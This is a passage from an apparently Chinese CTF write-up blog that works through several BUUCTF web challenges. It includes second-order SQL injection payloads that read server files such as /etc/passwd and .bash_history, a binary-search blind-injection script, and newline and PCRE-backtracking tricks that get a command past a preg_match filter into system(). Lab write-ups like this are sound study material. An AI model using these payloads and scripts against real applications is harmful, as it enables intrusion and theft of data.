class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>审计一下可以发现，本题中没有对address进行过滤，所以需要我们构造语句<br>真好 phpstorm崩溃了<br>想到之前sqlilabs刷的二次注入，一开始的change.php中只对address进行了 addslashes处理然后就进行了update处理<br>所以我的思路是这样的，先存一个address，然后用change插入注入语句，因为插入到表中以后转义的字符时不存在的，取出来也就不存在了，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524002354.png" alt="img" style="zoom:67%;"><br>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39; where &#96;user_id&#96;&#x3D;extractvalue(1,concat(&#39;~&#39;,(select load_file(&#39;&#x2F;flag.txt&#39;))))#</span><br></pre></td></tr></table></figure>

<p>至于为啥想读文件，因为表里没有–<br>最后这里看了一下wp，毕竟文件名要猜==</p>
<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>又是一题二次注入<br>首先是登录<br>账号是zhangwei 密码是zhagnwei666 后面数字直接爆破就行了<br>进去以后啥都没有，猜测是存在文件泄露——发现git泄露，扫描一波：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;mysql.php&quot;</span>;</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>($_SESSION[<span class="string">&#x27;login&#x27;</span>] != <span class="string">&#x27;yes&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;do&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">switch</span> ($_GET[<span class="string">&#x27;do&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;write&#x27;</span>:</span><br><span class="line">    $category = addslashes($_POST[<span class="string">&#x27;category&#x27;</span>]);</span><br><span class="line">    $title = addslashes($_POST[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into board</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                title = &#x27;<span class="subst">$title</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;comment&#x27;</span>:</span><br><span class="line">    $bo_id = addslashes($_POST[<span class="string">&#x27;bo_id&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;select category from board where id=&#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    $num = mysql_num_rows($result);</span><br><span class="line">    <span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    $category = mysql_fetch_array($result)[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    $content = addslashes($_POST[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line">    $sql = <span class="string">&quot;insert into comment</span></span><br><span class="line"><span class="string">            set category = &#x27;<span class="subst">$category</span>&#x27;,</span></span><br><span class="line"><span class="string">                content = &#x27;<span class="subst">$content</span>&#x27;,</span></span><br><span class="line"><span class="string">                bo_id = &#x27;<span class="subst">$bo_id</span>&#x27;&quot;</span>;</span><br><span class="line">    $result = mysql_query($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: ./comment.php?id=<span class="subst">$bo_id</span>&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ./index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>思路很明确了。我们需要利用category这个参数来传入值<br>首先我们利用write传值，然后利用comment改值<br>传入:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2&#39;,content&#x3D;(select database()),&#x2F;*</span><br></pre></td></tr></table></figure>

<p>这里解释一下 我们需要用/**/这个注释符，因为从源码中我们可以看出，他是多行的，所以我们需要选择多行注释符<br>接下来点击详情 输入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">*&#x2F;#</span><br></pre></td></tr></table></figure>

<p>进行闭合 并注释后面的内容<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524233459.png" alt="img" style="zoom:67%;"></p>
<p>可以看到如下</p>
<p>接下来就是常规注入，但是没有发现flag，这里新学了一种思路<br>我们查看user()发现是root权限<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524233602.png" alt="img" style="zoom:67%;"></p>
<p>既然是root权限，那么大概率其实应该是读取文件~<br>接下来就是寻找的一个过程了，这里学了一下学长的思路~很牛！<br>我们查看etc/passwd</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524234224.png" alt="img"><br>发现www用户的存在，于是这个时候 我们可以选择继续查看</p>
<p><strong>有时历史记录命令未存储在.bash_history中</strong></p>
<p>bash_history的记录 看看是否有线索：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210524234443.png" alt="img" style="zoom:67%;"><br>得到较完整路径，并且看到 <strong>.DS_Store</strong> 的存在<br> <strong>.DS_Store</strong> 是系统自动生成的一个隐藏的文件，存贮目录的自定义属性<br>所以我们可以看看其中的信息</p>
<p>目标环境是docker，所以 <strong>.DS_Store</strong> 文件应该在 <strong>/tmp</strong> 中。而 <strong>.DS_Store</strong> 文件中，经常会有一些不可键字符，所以我们可以使用hex函数对其内容进行转换，payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select hex(load_file(&#39;&#x2F;tmp&#x2F;html&#x2F;.DS_Store&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210525000523.png" alt="img" style="zoom:67%;">
找到flag，最终payload

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;,content&#x3D;(select (load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag_8946e1ff1ee3e40f.php&#39;))),&#x2F;*</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/22/postpreg-replace%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87/">preg_replace函数绕过</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-22</time><div class="content"><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>今天利用这道题来整理一下preg_match的绕过姿势<br><strong>首先我们来看看preg_match的返回值有什么:</strong><br>1.返回1<br>2.返回0<br>3.返回false</p>
<p>设想一下，如果preg_match作为判断条件，用来匹配危险字符，如果匹配到则为1此时我们就被waf掉了，如果是返回错误以及0，这就意味着着我们绕过了！</p>
<h2 id="0篇"><a href="#0篇" class="headerlink" title="0篇"></a>0篇</h2><p>接着，<strong>我们来看看有什么条件可以使我们匹配到0：</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522135857.png" alt="img" style="zoom:67%;"></p>
<p>根据文档我们可以发现，如果没有s的话，匹配到换行符，preg_match就会停止匹配（preg_match尽力匹配第一行）<br><strong>利用点:</strong><br>如果此时在我们的语句前加入一个换行符，那么此时的我们语句将不会被匹配到，前提preg_match模式符中没有添加s。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140748.png" alt="img" style="zoom: 50%;"><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522140814.png" alt="img" style="zoom: 50%;"></p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;%0A&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;%0A&quot;&#125;</span><br></pre></td></tr></table></figure>



<h2 id="false篇"><a href="#false篇" class="headerlink" title="false篇"></a>false篇</h2><h3 id="贪婪与非贪婪模式"><a href="#贪婪与非贪婪模式" class="headerlink" title="贪婪与非贪婪模式"></a>贪婪与非贪婪模式</h3><p>贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能多的匹配，也就是所谓的“贪婪”，通俗点讲，就是看到想要的，有多少就捡多少，除非再也没有想要的了。<br>非贪婪模式：可以这样认为，就是在整个表达式匹配成功的前提下，尽可能少的匹配，也就是所谓的“非贪婪”，通俗点讲，就是找到一个想要的捡起来就行了，至于还有没有没捡的就不管了。</p>
<h4 id="贪婪模式："><a href="#贪婪模式：" class="headerlink" title="贪婪模式："></a>贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src.*jpg/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>输出结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">array(1) &#123;</span><br><span class="line">  [0]&#x3D;&gt;</span><br><span class="line">  string(28) &quot;src&#x3D;&quot;mypic.jpg&quot;&#x2F;&gt; , goog jpg&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为是贪婪模式，所以这里多数除了一个jpg</p>
<h4 id="非贪婪模式："><a href="#非贪婪模式：" class="headerlink" title="非贪婪模式："></a>非贪婪模式：</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>] =&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;src=&quot;</span>mypic.jpg<span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以通过添加惰性限定符或修饰符进行处理</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522141957.png" alt="img"></p>
<h4 id="回溯"><a href="#回溯" class="headerlink" title="回溯"></a>回溯</h4><p>由于是非贪婪模式，所以有回溯的概念的存在：<br>举个例子</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$str = <span class="string">&#x27;this a img &lt;img src=&quot;mypic.jpg&quot;/&gt; , goog jpg ha ha&#x27;</span>;</span><br><span class="line">preg_match(<span class="string">&#x27;/src=&quot;.*?\.jpg&quot;/&#x27;</span>, $str, $match);</span><br><span class="line">var_dump($match);</span><br></pre></td></tr></table></figure>

<p>理解一下，大概是这个意思首先.<em>？在这里匹配的是src和.jpg之间的内容，那么匹配的流程是这样的：首先.\</em>？匹配到“=”号，此时=号满足，放入备选录当中，接下来将匹配控制权交给jpg，发现这个=号不满足，于是回溯给.*？让它匹配了，所以最终结果就是src=”mypic.jpg”</p>
<h4 id="次数限制"><a href="#次数限制" class="headerlink" title="次数限制"></a>次数限制</h4><p>回溯也不是想回多少次就回多少次，</p>
<p>在PHP中，正则匹配的递归次数由 <a target="_blank" rel="noopener" href="http://php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> 控制 <strong>PHP5.3.7</strong> 版本之前默认值为 <strong>10万</strong> ，<strong>PHP5.3.7</strong> 版本之后默认值为 <strong>100万</strong> ，该值可以通过php.ini设置，也可以通过 <strong>phpinfo</strong> 页面查看。<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210522144601.png" alt="img" style="zoom:50%;"><br>如上所示，当我们超过回溯次数，此时返回的就是<strong>false</strong></p>
<h4 id="演示："><a href="#演示：" class="headerlink" title="演示："></a>演示：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data &#x3D; &#39;&lt;?php phpinfo();aaaaa&#39;.str_repeat(&#39; &#39;,1000000);</span><br><span class="line">$a&#x3D;preg_match(&#39;&#x2F;&lt;\?.*[(&#96;;?&gt;].*&#x2F;is&#39;, $data,$data1);</span><br><span class="line">print_r($a);</span><br><span class="line">print_r($data1);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>此时就匹配不到了<br>脚本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">payload &#x3D; &#39;&#123;&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag &quot;,&quot;a&quot;:&quot;&#39; + &quot;a&quot;*(1000000) + &#39;&quot;&#125;&#39;</span><br><span class="line">res &#x3D; requests.post(&quot;http:&#x2F;&#x2F;c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn&#x2F;&quot;, data&#x3D;&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.liuhaolin.com/php/195.html">https://www.liuhaolin.com/php/195.html</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/phpfenghuo/article/details/17316645">https://blog.csdn.net/phpfenghuo/article/details/17316645</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/05/15/buuctf15/">buuctf15</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-05-15</time><div class="content"><h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>这题sql注入，过滤了空格测试语句</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;1</span><br><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;1&#x3D;2</span><br></pre></td></tr></table></figure>

<p>盲注：需要写脚本=：<br>构造payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#x2F;**&#x2F;and&#x2F;**&#x2F;substr(database(),1,1)&#x3D;&#39;1&#39;--</span><br></pre></td></tr></table></figure>

<p>学习一下使用二分法进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;b2b3ad31-796e-489d-8ad3-3dc8c3fc8257.node3.buuoj.cn&#x2F;?stunum&#x3D;&quot;</span><br><span class="line">s&#x3D;requests.session()</span><br><span class="line">database&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,10000):</span><br><span class="line">    low &#x3D;32</span><br><span class="line">    high&#x3D;128</span><br><span class="line">    mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    while(low&lt;high):</span><br><span class="line">        #payload_1&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr(database(),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_2&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(table_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.tables&#x2F;**&#x2F;where&#x2F;**&#x2F;table_schema&#x3D;&#39;ctf&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        #payload_3&#x3D;f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;group_concat(column_name)&#x2F;**&#x2F;from&#x2F;**&#x2F;information_schema.columns&#x2F;**&#x2F;where&#x2F;**&#x2F;table_name&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        payload_4&#x3D; f&quot;1&#x2F;**&#x2F;and&#x2F;**&#x2F;ascii(substr((select&#x2F;**&#x2F;value&#x2F;**&#x2F;from&#x2F;**&#x2F;flag),&#123;i&#125;,1))&gt;&#123;mid&#125;&quot;</span><br><span class="line">        if &quot;Hi admin&quot; in s.get(url+payload_4).text:</span><br><span class="line">            low &#x3D; mid+1</span><br><span class="line">        else:</span><br><span class="line">            high&#x3D;mid</span><br><span class="line">        mid&#x3D;(low+high)&#x2F;&#x2F;2</span><br><span class="line">    if(mid&#x3D;&#x3D;32 or mid&#x3D;&#x3D;132):</span><br><span class="line">        break</span><br><span class="line">    database +&#x3D;chr(mid)</span><br><span class="line">    print(database)</span><br><span class="line">print(database)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>二分法快了不是一倍两倍– 真的超级快==</p>
<h2 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h2><p>让我们以admin的方式登录，并且提示cookie，所以我就在cookie里添加，username=admin，就可以拿到flag了</p>
<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>输入json类型数据:<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html">https://www.cnblogs.com/skysoot/archive/2012/04/17/2453010.html</a></p>
<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;&#x2F;&#x2F;有回显</span><br></pre></td></tr></table></figure>

<p>然后想cat却不行，应该是有过滤==，然后去看了一下wp，说是比赛的时候有源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">  $json = $_REQUEST[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!is_string($json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, $json)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    $cmd = json_decode($json, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> ($cmd !== <span class="literal">NULL</span>) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>确实是过滤了很多内容</p>
<p>考点分析一下:</p>
<p><strong>1.如何绕过过滤？</strong><br>绕过preg_match方法有两种:<br>(1).preg_match会去努力的去匹配第一行，所以我们可以利用多行的方式进行绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">cmd&#x3D;&#123;</span><br><span class="line">           &quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat%20&#x2F;home&#x2F;rceservice&#x2F;flag&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以直接加一个**%0A**这个也是代表换行符<br>(2).利用PCRE回溯绕过<br>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag &quot;,&quot;a&quot;:&quot;&#x27;</span> + <span class="string">&quot;a&quot;</span>*(<span class="number">1000000</span>) + <span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">res = requests.post(<span class="string">&quot;http://c7f06821-9d9b-468e-9f9f-21c3454d5c7d.node3.buuoj.cn/&quot;</span>, data=&#123;<span class="string">&quot;cmd&quot;</span>:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><strong>2.为什么我们无法使用cat命令？</strong><br>putenv(‘PATH=/home/rceservice/jail’)根据这行源码，读出jail应用于当前环境，我们能使用ls应该是 jali包含了执行二进制文件，所以我们可以直接拉出cat的路径:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;: &quot;</span><br><span class="line">&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag</span><br><span class="line">&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong>：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
<p>通过以上成功拿到flag</p>
<h2 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h2><p>image.php.bak源码泄露:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;﻿?php</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=<span class="keyword">isset</span>($_GET[<span class="string">&quot;id&quot;</span>])?$_GET[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line">$path=<span class="keyword">isset</span>($_GET[<span class="string">&quot;path&quot;</span>])?$_GET[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line">$path=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=<span class="string">&quot;./&quot;</span> . $row[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>首先进行绕过，这里测试一下绕过语句:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;&#39; or path&#x3D;&#39;&#39;;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id=<span class="string">&quot;\\0&quot;</span>;</span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$id=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,$id);</span><br><span class="line"><span class="keyword">print</span>($id);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">\</span><br></pre></td></tr></table></figure>

<p>可见当我们输入\\0的时候最终的结果是\逃逸出来了，设想一下，如果我们在id输入这个，那么久会变成</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from images where id&#x3D;&#39;\&#39; or path&#x3D;&#39;&#39;;</span><br><span class="line">此时后面那个单引号被转义，变成是id&#x3D;\&#39; or path&#x3D;&#39;</span><br><span class="line">如果我们在path后插入注入语句or 1&#x3D;1#，将变成</span><br><span class="line">id&#x3D;&#39;\&#39; or path&#x3D;&#39; or 1&#x3D;1#&#39; </span><br></pre></td></tr></table></figure>

<p>这里贴一下盲注脚本:</p>
